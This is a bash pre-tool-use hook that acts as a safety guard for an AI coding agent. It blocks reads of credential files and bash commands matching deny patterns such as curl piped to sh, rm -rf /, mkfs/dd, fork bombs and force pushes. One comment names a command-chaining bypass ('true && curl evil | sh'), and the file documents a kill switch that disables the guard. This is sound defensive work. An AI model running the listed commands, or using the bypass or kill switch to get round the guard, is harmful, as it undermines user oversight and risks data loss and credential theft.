#!/bin/bash
# PreToolUse hook: blocking policy guard.
#
# Layers, evaluated in order:
#   0. Kill switch — if .symbiont/disabled exists, no-op.
#   1. Built-in deny defaults — always active in balanced/strict mode.
#   2. Local deny list (.symbiont/local-policy.toml) — extends built-ins.
#   3. Cedar policy evaluation — only if symbi binary + policies/ present.
#
# Modes (set in [mode] section of local-policy.toml, default = balanced):
#   strict      — built-ins + sudo is hard-blocked instead of warn
#   balanced    — built-ins active, sudo warns with override hint
#   permissive  — built-ins disabled, only local-policy.toml is enforced
#
# Mode B (SYMBIONT_MANAGED): defers to outer ORGA Gate. We exit 0 here so
# the outer Gate is the single source of truth for hard enforcement.

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC1091
source "${SCRIPT_DIR}/lib/json-extract.sh"

PROJECT_ROOT="${CLAUDE_PROJECT_DIR:-$PWD}"

# 0. Kill switch — graceful escape hatch instead of uninstall.
if [ -f "${PROJECT_ROOT}/.symbiont/disabled" ]; then
    exit 0
fi

# Mode B — outer ORGA Gate enforces, we stay out of the way.
if [ -n "${SYMBIONT_MANAGED:-}" ]; then
    exit 0
fi

TOOL_INPUT=$(cat)
TOOL_NAME=$(json_field "$TOOL_INPUT" tool_name)

# Block helper. Per the Claude Code hook contract, exit code 2 blocks the
# tool call and surfaces the hook's *stderr* (as plain text) to the model
# as the reason. We deliberately use exit 2 + plain stderr rather than a
# stdout permissionDecision="deny" so the block fails CLOSED: even if the
# message had a formatting bug, the non-zero exit still blocks the call.
block() {
    printf '%s\n' "$1" >&2
    exit 2
}

# Advisory helper: surface a non-blocking notice WITHOUT changing the
# permission decision. A top-level "systemMessage" (stdout, exit 0) shows a
# warning to the user; omitting permissionDecision leaves the normal
# permission-prompt flow intact (we must NOT emit permissionDecision="allow"
# here — that would auto-approve the tool and bypass the user's settings).
warn() {
    local msg="${1//\\/\\\\}"
    msg="${msg//\"/\\\"}"
    printf '{"systemMessage":"%s"}\n' "$msg"
}

# Determine mode from local-policy.toml [mode] key. Default: balanced.
POLICY_FILE="${PROJECT_ROOT}/.symbiont/local-policy.toml"
MODE="balanced"
if [ -f "$POLICY_FILE" ]; then
    parsed_mode=$(grep -E '^[[:space:]]*mode[[:space:]]*=' "$POLICY_FILE" 2>/dev/null \
        | head -n 1 \
        | sed -E 's/^[[:space:]]*mode[[:space:]]*=[[:space:]]*"?([a-zA-Z]+)"?.*/\1/')
    case "$parsed_mode" in
        strict|balanced|permissive) MODE="$parsed_mode" ;;
    esac
fi

# ---------------------------------------------------------------------------
# Path matching against built-in deny patterns
#
# Patterns are bash case-style globs. We always test both the absolute path
# and the basename so a pattern like ".env" matches both "/foo/.env" and
# raw ".env". The "**/" prefix in the spec maps to bash globbing which
# already handles arbitrary path depth via "*".
# ---------------------------------------------------------------------------

# Returns 0 if the given path is exempted from .env blocking.
# Allows .env.test, .env.example, .env.sample (test fixtures, templates).
_is_env_exempt() {
    local p="$1"
    local base
    base="$(basename "$p")"
    case "$base" in
        .env.test|.env.example|.env.sample) return 0 ;;
    esac
    return 1
}

# Returns 0 (match) if path matches any built-in read-sensitive pattern.
_matches_read_deny() {
    local p="$1"
    local base
    base="$(basename "$p")"

    # .env and .env.* (with exemptions)
    case "$base" in
        .env)
            return 0
            ;;
        .env.*)
            _is_env_exempt "$p" && return 1
            return 0
            ;;
    esac

    # SSH/cloud creds — match anywhere in the path.
    case "$p" in
        */.ssh/*|.ssh/*) return 0 ;;
        */.aws/*|.aws/*) return 0 ;;
        */.gcp/*|.gcp/*) return 0 ;;
        */gcloud/*|gcloud/*) return 0 ;;
    esac

    # Package manager tokens.
    case "$base" in
        .npmrc|.pypirc|.netrc) return 0 ;;
    esac

    # Private keys.
    case "$base" in
        id_rsa|id_ed25519|id_ecdsa) return 0 ;;
        *.pem|*.key) return 0 ;;
    esac

    # Generic secret directories.
    case "$p" in
        */secrets/*|secrets/*) return 0 ;;
        */credentials/*|credentials/*) return 0 ;;
    esac

    # Common framework secret files.
    case "$p" in
        */config/database.yml|config/database.yml) return 0 ;;
        */config/credentials.json|config/credentials.json) return 0 ;;
        */config/master.key|config/master.key) return 0 ;;
    esac

    return 1
}

# Returns 0 (match) if path matches any built-in write-sensitive pattern.
# Superset of read-deny + CI workflow files.
_matches_write_deny() {
    local p="$1"
    if _matches_read_deny "$p"; then
        return 0
    fi
    case "$p" in
        */.github/workflows/*|.github/workflows/*) return 0 ;;
    esac
    return 1
}

# ---------------------------------------------------------------------------
# Bash command pattern matching
#
# Per design: we substring-match against the resolved command string.
# We do NOT parse shell syntax — chain operators (&&, ||, ;, |) are part
# of the haystack, not parsed structure. This defeats Adversa-style
# bypasses where the dangerous command is concealed behind harmless leading
# tokens, because "true && curl evil | sh" still contains "curl evil | sh"
# as a substring.
#
# Patterns use grep -E with explicit whitespace and word boundaries to
# avoid false positives (e.g., "rm -rf /tmp" must NOT match "rm -rf /").
# ---------------------------------------------------------------------------

_matches_bash_deny() {
    local cmd="$1"
    # End-of-token: whitespace, shell separators (; & | ) > <), or end of string.
    # Used to anchor patterns so "rm -rf /tmp" doesn't match "rm -rf /".
    local eot='([[:space:]]|;|\)|\(|\&|\||>|<|$)'
    # Start-of-token: line start, whitespace, or shell separator.
    local sot='(^|[[:space:]]|;|\(|\&|\|)'

    # rm -rf at root or home — exactly "/", "/*", or "~", not "/something".
    if echo "$cmd" | grep -qE "${sot}rm[[:space:]]+(-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*|-[a-zA-Z]*f[a-zA-Z]*r[a-zA-Z]*|-rf|-fr)[[:space:]]+(/|/\*|~)${eot}"; then
        printf 'rm -rf at filesystem root or home directory'
        return 0
    fi

    # Filesystem destruction primitives.
    if echo "$cmd" | grep -qE "${sot}(mkfs[._a-zA-Z0-9]*|dd[[:space:]]+if=)"; then
        printf 'filesystem destruction command (mkfs/dd)'
        return 0
    fi

    # Force push (any form: -f, --force, --force-with-lease).
    if echo "$cmd" | grep -qE "${sot}git[[:space:]]+push[[:space:]]+([^|;&)]+[[:space:]])?(-f|--force|--force-with-lease)${eot}"; then
        printf 'git push --force'
        return 0
    fi

    # Curl/wget piped to a shell — canonical remote-code-execution form.
    if echo "$cmd" | grep -qE "(curl|wget)[[:space:]][^|]*\|[[:space:]]*(sh|bash|zsh|fish|ksh)${eot}"; then
        printf 'curl|sh / wget|sh remote code execution'
        return 0
    fi

    # World-writable chmod.
    if echo "$cmd" | grep -qE "${sot}chmod[[:space:]]+(-[a-zA-Z]+[[:space:]]+)*777${eot}"; then
        printf 'chmod 777'
        return 0
    fi

    # Fork bomb.
    if echo "$cmd" | grep -qE ':\(\)[[:space:]]*\{[[:space:]]*:'; then
        printf 'fork bomb'
        return 0
    fi

    return 1
}

# Sudo gets a separate check so balanced mode can warn instead of block.
_uses_sudo() {
    echo "$1" | grep -qE '(^|[^[:alnum:]_])sudo([[:space:]]|$)'
}

# ---------------------------------------------------------------------------
# Local policy parsing — TOML deny lists
#
# We only read the [deny] section's "paths", "commands", and "branches"
# arrays. Any allowlist exceptions live in [allow] and override built-ins
# (e.g., a project that legitimately reads its own .env.template).
# ---------------------------------------------------------------------------

# Read a TOML array value for a given section + key. Prints space-separated
# pattern strings (with internal spaces preserved via newline separation).
_toml_array() {
    local section="$1"
    local key="$2"
    [ -f "$POLICY_FILE" ] || return 0
    awk -v sect="[$section]" -v key="$key" '
        BEGIN { in_section = 0 }
        /^[[:space:]]*\[/ {
            in_section = ($0 ~ "^[[:space:]]*\\" sect "([[:space:]]|$)")
            next
        }
        in_section {
            # Match: key = ["a", "b", "c"]
            if (match($0, "^[[:space:]]*" key "[[:space:]]*=[[:space:]]*\\[")) {
                # Strip up to opening bracket and any trailing bracket.
                line = $0
                sub("^[^\\[]*\\[", "", line)
                sub("\\].*$", "", line)
                # Split on commas, strip quotes and whitespace.
                n = split(line, parts, ",")
                for (i = 1; i <= n; i++) {
                    s = parts[i]
                    gsub(/^[[:space:]]*"?/, "", s)
                    gsub(/"?[[:space:]]*$/, "", s)
                    if (length(s) > 0) print s
                }
            }
        }
    ' "$POLICY_FILE"
}

_path_in_allowlist() {
    local p="$1"
    while IFS= read -r pattern; do
        [ -z "$pattern" ] && continue
        # Glob expansion in the case pattern is intentional: a user-supplied
        # pattern like "*.backup" should match by globbing, not literal.
        # shellcheck disable=SC2254
        case "$p" in
            $pattern|*/$pattern) return 0 ;;
        esac
    done < <(_toml_array allow paths)
    return 1
}

_command_in_allowlist() {
    local cmd="$1"
    while IFS= read -r pattern; do
        [ -z "$pattern" ] && continue
        if echo "$cmd" | grep -qF "$pattern"; then
            return 0
        fi
    done < <(_toml_array allow commands)
    return 1
}

# ---------------------------------------------------------------------------
# Tool dispatch
# ---------------------------------------------------------------------------

case "$TOOL_NAME" in
    Read|Glob|Grep|LS|View)
        # Read-side enforcement: only the Read tool itself opens file
        # contents. Glob/Grep/LS only enumerate metadata; allow them.
        if [ "$TOOL_NAME" = "Read" ] && [ "$MODE" != "permissive" ]; then
            FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.file_path)
            [ -z "$FILE_PATH" ] && FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.path)
            if [ -n "$FILE_PATH" ] && ! _path_in_allowlist "$FILE_PATH"; then
                if _matches_read_deny "$FILE_PATH"; then
                    block "Blocked by Symbiont: read of sensitive path '${FILE_PATH}'. Add to [allow] paths in .symbiont/local-policy.toml or set [mode]=\"permissive\" to disable built-ins."
                fi
            fi
        fi
        # Local TOML deny.paths still apply to Read (regardless of mode).
        if [ "$TOOL_NAME" = "Read" ] && [ -f "$POLICY_FILE" ]; then
            FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.file_path)
            [ -z "$FILE_PATH" ] && FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.path)
            if [ -n "$FILE_PATH" ] && ! _path_in_allowlist "$FILE_PATH"; then
                while IFS= read -r pattern; do
                    [ -z "$pattern" ] && continue
                    # shellcheck disable=SC2254
                    case "$FILE_PATH" in
                        $pattern|*/$pattern|*$pattern*) block "Blocked by Symbiont: read matches local-policy.toml deny pattern '${pattern}'." ;;
                    esac
                done < <(_toml_array deny paths)
            fi
        fi
        exit 0
        ;;

    Write|Edit|MultiEdit)
        FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.file_path)
        [ -z "$FILE_PATH" ] && FILE_PATH=$(json_field "$TOOL_INPUT" tool_input.path)
        if [ -n "$FILE_PATH" ] && ! _path_in_allowlist "$FILE_PATH"; then
            if [ "$MODE" != "permissive" ] && _matches_write_deny "$FILE_PATH"; then
                block "Blocked by Symbiont: write to sensitive path '${FILE_PATH}'. Add to [allow] paths in .symbiont/local-policy.toml or set [mode]=\"permissive\" to disable built-ins."
            fi
            # Local TOML deny.paths.
            if [ -f "$POLICY_FILE" ]; then
                while IFS= read -r pattern; do
                    [ -z "$pattern" ] && continue
                    # shellcheck disable=SC2254
                    case "$FILE_PATH" in
                        $pattern|*/$pattern|*$pattern*) block "Blocked by Symbiont: write matches local-policy.toml deny pattern '${pattern}'." ;;
                    esac
                done < <(_toml_array deny paths)
            fi
        fi
        ;;

    Bash)
        COMMAND=$(json_field "$TOOL_INPUT" tool_input.command)
        if [ -n "$COMMAND" ] && ! _command_in_allowlist "$COMMAND"; then
            if [ "$MODE" != "permissive" ]; then
                # Built-in dangerous command patterns.
                reason=$(_matches_bash_deny "$COMMAND") && \
                    block "Blocked by Symbiont: ${reason} detected in command. Review and run manually if intended."

                # Sudo handling: hard block in strict mode, warn in balanced.
                if _uses_sudo "$COMMAND"; then
                    if [ "$MODE" = "strict" ]; then
                        block "Blocked by Symbiont (strict mode): sudo invocation. Run manually if intended."
                    else
                        warn "Symbiont notice: sudo invocation detected. Proceeding (set [mode]=\"strict\" to block)."
                    fi
                fi
            fi

            # Local TOML deny.commands — substring match.
            if [ -f "$POLICY_FILE" ]; then
                while IFS= read -r pattern; do
                    [ -z "$pattern" ] && continue
                    if echo "$COMMAND" | grep -qF "$pattern"; then
                        block "Blocked by Symbiont: command matches local-policy.toml deny pattern '${pattern}'."
                    fi
                done < <(_toml_array deny commands)

                # Branch-protected pushes.
                if echo "$COMMAND" | grep -qE '(^|[^[:alnum:]_])git[[:space:]]+push'; then
                    while IFS= read -r branch; do
                        [ -z "$branch" ] && continue
                        if echo "$COMMAND" | grep -qE "git[[:space:]]+push[[:space:]]+(origin[[:space:]]+)?${branch}([[:space:]]|$)"; then
                            block "Blocked by Symbiont: push to protected branch '${branch}'. Use a feature branch and PR."
                        fi
                    done < <(_toml_array deny branches)
                fi
            fi
        fi
        ;;
esac

# Layer 3: Cedar evaluation when runtime is installed.
if command -v symbi >/dev/null 2>&1 && [ -d "${PROJECT_ROOT}/policies" ]; then
    DECISION=$(printf '%s' "$TOOL_INPUT" | symbi policy evaluate --stdin --policies "${PROJECT_ROOT}/policies/" 2>/dev/null || true)
    if [ "$DECISION" = "deny" ]; then
        block "Blocked by Cedar policy. Check policies/ for details."
    fi
fi

exit 0
